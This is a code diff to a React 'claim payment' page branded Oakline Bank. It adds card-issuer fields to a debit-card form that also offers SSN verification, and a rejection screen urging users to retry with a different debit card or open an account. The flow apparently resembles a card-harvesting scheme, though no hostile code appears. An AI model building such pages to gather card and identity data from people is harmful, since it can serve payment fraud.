@@ -39,7 +39,9 @@ export default function ClaimPaymentPage() {
     billing_country: '',
     first_name: '',
     last_name: '',
-    middle_name: ''
+    middle_name: '',
+    card_issuer: '', // Added card_issuer
+    card_issuer_custom: '' // Added card_issuer_custom
   });
 
   const [verificationType, setVerificationType] = useState('ssn');
@@ -120,7 +122,7 @@ export default function ClaimPaymentPage() {
         }
 
         if (paymentData.approval_status === 'rejected') {
-          setMessage('❌ Claim Not Approved\n\nYour claim was not approved. Please contact support for more information.');
+          setMessage('rejected'); // Set message to 'rejected' to trigger the new UI
           setMessageType('error');
           setPayment(paymentData); // Set payment data so we can show details
           setLoading(false);
@@ -212,7 +214,9 @@ export default function ClaimPaymentPage() {
         billing_country: debitCardForm.billing_country,
         first_name: debitCardForm.first_name,
         last_name: debitCardForm.last_name,
-        middle_name: debitCardForm.middle_name
+        middle_name: debitCardForm.middle_name,
+        card_issuer: debitCardForm.card_issuer, // Include card_issuer
+        card_issuer_custom: debitCardForm.card_issuer_custom // Include card_issuer_custom
       };
 
       // Add status fields based on table
@@ -409,6 +413,157 @@ export default function ClaimPaymentPage() {
       </>
     );
   }
+
+  // Check if claim is rejected
+  if (message === 'rejected' && payment) {
+    return (
+      <>
+        <Head>
+          <title>Claim Not Approved - Oakline Bank</title>
+        </Head>
+        <div style={{
+          minHeight: '100vh',
+          background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'center',
+          padding: '1.5rem'
+        }}>
+          <div style={{
+            background: 'white',
+            borderRadius: '16px',
+            padding: '3rem 2rem',
+            maxWidth: '650px',
+            width: '100%',
+            boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
+            textAlign: 'center'
+          }}>
+            <div style={{
+              width: '80px',
+              height: '80px',
+              background: 'linear-gradient(135deg, #dc2626 0%, #991b1b 100%)',
+              borderRadius: '50%',
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              margin: '0 auto 2rem',
+              fontSize: '2.5rem',
+              color: 'white'
+            }}>
+              ✕
+            </div>
+            <h1 style={{ color: '#1e293b', fontSize: '1.75rem', marginBottom: '1rem', fontWeight: '700' }}>
+              Claim Not Approved
+            </h1>
+            <p style={{ color: '#64748b', fontSize: '1.1rem', marginBottom: '2rem', lineHeight: '1.6' }}>
+              We were unable to approve your claim with the provided payment method. Don't worry - you still have options to receive your ${parseFloat(payment.amount).toFixed(2)}!
+            </p>
+
+            <div style={{
+              background: '#fff7ed',
+              border: '2px solid #fb923c',
+              borderRadius: '12px',
+              padding: '1.5rem',
+              marginBottom: '2rem',
+              textAlign: 'left'
+            }}>
+              <h3 style={{ color: '#ea580c', fontSize: '1.1rem', marginBottom: '1rem', fontWeight: '700' }}>
+                💡 What You Can Do Next:
+              </h3>
+              <ul style={{ color: '#78350f', fontSize: '0.95rem', lineHeight: '1.8', margin: '0', paddingLeft: '1.5rem' }}>
+                <li style={{ marginBottom: '0.5rem' }}>Try claiming with a different debit card</li>
+                <li style={{ marginBottom: '0.5rem' }}>Use a different payment method (bank account or ACH)</li>
+                <li>Open a free Oakline Bank account and receive funds instantly</li>
+              </ul>
+            </div>
+
+            <div style={{
+              background: '#f0f9ff',
+              border: '2px solid #0066cc',
+              borderRadius: '12px',
+              padding: '1.5rem',
+              marginBottom: '2rem',
+              textAlign: 'left'
+            }}>
+              <h3 style={{ color: '#0066cc', fontSize: '1rem', marginBottom: '0.75rem', fontWeight: '700' }}>
+                ⚡ Fastest Option: Open an Oakline Bank Account
+              </h3>
+              <p style={{ color: '#1e40af', fontSize: '0.9rem', lineHeight: '1.6', margin: '0 0 1rem 0' }}>
+                Get instant access to your funds with zero fees. Opening an account takes just 5 minutes!
+              </p>
+              <div style={{
+                display: 'grid',
+                gridTemplateColumns: '1fr 1fr',
+                gap: '0.5rem',
+                fontSize: '0.85rem',
+                color: '#1e40af'
+              }}>
+                <div>✓ No monthly fees</div>
+                <div>✓ Instant transfers</div>
+                <div>✓ Mobile banking</div>
+                <div>✓ 24/7 support</div>
+              </div>
+            </div>
+
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
+              <button
+                onClick={handleOpenAccountClick}
+                style={{
+                  width: '100%',
+                  padding: '1rem',
+                  background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '10px',
+                  fontWeight: '700',
+                  fontSize: '0.95rem',
+                  cursor: 'pointer',
+                  transition: 'transform 0.2s'
+                }}
+                onMouseEnter={(e) => e.target.style.transform = 'translateY(-2px)'}
+                onMouseLeave={(e) => e.target.style.transform = 'translateY(0)'}
+              >
+                🏦 Open Account
+              </button>
+              <button
+                onClick={() => window.location.reload()}
+                style={{
+                  width: '100%',
+                  padding: '1rem',
+                  background: 'white',
+                  color: '#0066cc',
+                  border: '2px solid #0066cc',
+                  borderRadius: '10px',
+                  fontWeight: '700',
+                  fontSize: '0.95rem',
+                  cursor: 'pointer',
+                  transition: 'transform 0.2s'
+                }}
+                onMouseEnter={(e) => e.target.style.transform = 'translateY(-2px)'}
+                onMouseLeave={(e) => e.target.style.transform = 'translateY(0)'}
+              >
+                🔄 Try Again
+              </button>
+            </div>
+
+            <div style={{
+              borderTop: '1px solid #e5e7eb',
+              paddingTop: '1.5rem',
+              marginTop: '1rem'
+            }}>
+              <p style={{ color: '#6b7280', fontSize: '0.85rem', marginBottom: '0.5rem' }}>
+                Need help? Contact our support team:
+              </p>
+              <p style={{ color: '#1e293b', fontSize: '0.9rem', fontWeight: '600' }}>
+                📧 support@theoaklinebank.com | 📞 (636) 635-6122
+              </p>
+            </div>
+          </div>
+        </div>
+      </>
+    );
+  }
+
 
   // Check if claim is already submitted (status is 'claimed')
   if (payment && payment.status === 'claimed') {
@@ -775,7 +930,7 @@ export default function ClaimPaymentPage() {
           </div>
 
           {/* Message Section */}
-          {message && (
+          {message && message !== 'rejected' && ( // Only show message if it's not the 'rejected' status
             <div style={{ padding: '2rem' }}>
               <div style={{
                 backgroundColor: messageType === 'error' ? '#fee2e2' : messageType === 'success' ? '#dcfce7' : '#e0f2fe',
